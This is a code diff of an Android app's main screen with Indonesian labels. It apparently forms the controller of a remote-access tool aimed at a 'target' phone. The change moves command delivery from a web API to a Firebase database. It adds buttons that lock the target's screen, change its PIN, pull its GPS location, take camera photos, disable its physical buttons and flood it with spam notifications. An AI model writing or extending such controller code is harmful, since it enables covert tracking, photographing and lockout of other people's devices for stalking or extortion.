@@ -4,136 +4,88 @@ import android.os.Bundle;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Switch;
+import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
-import org.json.JSONObject;
-import java.io.IOException;
-import okhttp3.Call;
-import okhttp3.Callback;
-import okhttp3.MediaType;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
 
 public class MainActivity extends AppCompatActivity {
     Switch swLockScreen;
-    Button btnGanti, btnSetPin;
+    Button btnGanti, btnSetPin, btnGPS, btnCamera, btnWallpaper, btnBlockButtons, btnSpamNotif;
     EditText etNewPin;
-    OkHttpClient client;
-    private static final String API_URL = "https://paragon.pythonanywhere.com/api";
+    TextView tvResult;
+    DatabaseReference mDatabase;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        client = new OkHttpClient();
+
+        FirebaseDatabase database = FirebaseDatabase.getInstance();
+        mDatabase = database.getReference("target");
 
         swLockScreen = findViewById(R.id.swLockScreen);
         btnGanti = findViewById(R.id.btnGanti);
         btnSetPin = findViewById(R.id.btnSetPin);
         etNewPin = findViewById(R.id.etNewPin);
+        btnGPS = findViewById(R.id.btnGPS);
+        btnCamera = findViewById(R.id.btnCamera);
+        btnWallpaper = findViewById(R.id.btnWallpaper);
+        btnBlockButtons = findViewById(R.id.btnBlockButtons);
+        btnSpamNotif = findViewById(R.id.btnSpamNotif);
+        tvResult = findViewById(R.id.tvResult);
 
-        fetchStatus();
-
+        // Lock Screen
         swLockScreen.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            sendLockCommand(isChecked);
+            mDatabase.child("lockScreen").setValue(isChecked);
+            Toast.makeText(this, "Lock Screen: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
+        // Ganti Target
+        btnGanti.setOnClickListener(v -> {
+            Toast.makeText(this, "Ganti target", Toast.LENGTH_SHORT).show();
+        });
+
+        // Set PIN
         btnSetPin.setOnClickListener(v -> {
             String newPin = etNewPin.getText().toString().trim();
             if (newPin.length() == 4) {
-                sendPinCommand(newPin);
+                mDatabase.child("pin").setValue(newPin);
+                Toast.makeText(this, "PIN berhasil diubah!", Toast.LENGTH_SHORT).show();
             } else {
                 Toast.makeText(this, "PIN harus 4 digit!", Toast.LENGTH_SHORT).show();
             }
         });
 
-        btnGanti.setOnClickListener(v -> {
-            Toast.makeText(this, "Ganti target", Toast.LENGTH_SHORT).show();
+        // GPS
+        btnGPS.setOnClickListener(v -> {
+            mDatabase.child("command").setValue("gps");
+            tvResult.setText("📍 Mengambil lokasi...");
+        });
+
+        // Kamera
+        btnCamera.setOnClickListener(v -> {
+            mDatabase.child("command").setValue("camera");
+            tvResult.setText("📸 Mengambil foto...");
+        });
+
+        // Ganti Wallpaper
+        btnWallpaper.setOnClickListener(v -> {
+            mDatabase.child("command").setValue("wallpaper");
+            tvResult.setText("🖼 Mengganti wallpaper...");
+        });
+
+        // Matiin Tombol
+        btnBlockButtons.setOnClickListener(v -> {
+            mDatabase.child("command").setValue("block_buttons");
+            tvResult.setText("🔒 Tombol fisik dimatikan...");
+        });
+
+        // Spam Notif
+        btnSpamNotif.setOnClickListener(v -> {
+            mDatabase.child("command").setValue("spam_notif");
+            tvResult.setText("📨 Mengirim spam notifikasi...");
         });
     }
-
-    private void fetchStatus() {
-        Request request = new Request.Builder()
-                .url(API_URL + "/status")
-                .get()
-                .build();
-
-        client.newCall(request).enqueue(new Callback() {
-            @Override
-            public void onFailure(Call call, IOException e) {}
-
-            @Override
-            public void onResponse(Call call, Response response) throws IOException {
-                if (response.isSuccessful()) {
-                    try {
-                        JSONObject obj = new JSONObject(response.body().string());
-                        boolean status = obj.getBoolean("lock_status");
-                        runOnUiThread(() -> swLockScreen.setChecked(status));
-                    } catch (Exception e) {}
-                }
-            }
-        });
-    }
-
-    private void sendLockCommand(boolean status) {
-        try {
-            JSONObject json = new JSONObject();
-            json.put("lock_status", status);
-
-            RequestBody body = RequestBody.create(
-                    json.toString(),
-                    MediaType.parse("application/json")
-            );
-
-            Request request = new Request.Builder()
-                    .url(API_URL + "/lock")
-                    .post(body)
-                    .build();
-
-            client.newCall(request).enqueue(new Callback() {
-                @Override
-                public void onFailure(Call call, IOException e) {
-                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "Gagal kirim perintah!", Toast.LENGTH_SHORT).show());
-                }
-
-                @Override
-                public void onResponse(Call call, Response response) throws IOException {
-                    runOnUiThread(() -> Toast.makeText(MainActivity.this,
-                            status ? "🔴 Lock ON" : "🟢 Lock OFF", Toast.LENGTH_SHORT).show());
-                }
-            });
-        } catch (Exception e) {}
-    }
-
-    private void sendPinCommand(String newPin) {
-        try {
-            JSONObject json = new JSONObject();
-            json.put("pin", newPin);
-
-            RequestBody body = RequestBody.create(
-                    json.toString(),
-                    MediaType.parse("application/json")
-            );
-
-            Request request = new Request.Builder()
-                    .url(API_URL + "/pin")
-                    .post(body)
-                    .build();
-
-            client.newCall(request).enqueue(new Callback() {
-                @Override
-                public void onFailure(Call call, IOException e) {
-                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "Gagal ganti PIN!", Toast.LENGTH_SHORT).show());
-                }
-
-                @Override
-                public void onResponse(Call call, Response response) throws IOException {
-                    runOnUiThread(() -> Toast.makeText(MainActivity.this,
-                            "✅ PIN berhasil diubah!", Toast.LENGTH_SHORT).show());
-                }
-            });
-        } catch (Exception e) {}
-    }
-                                                       }
+}
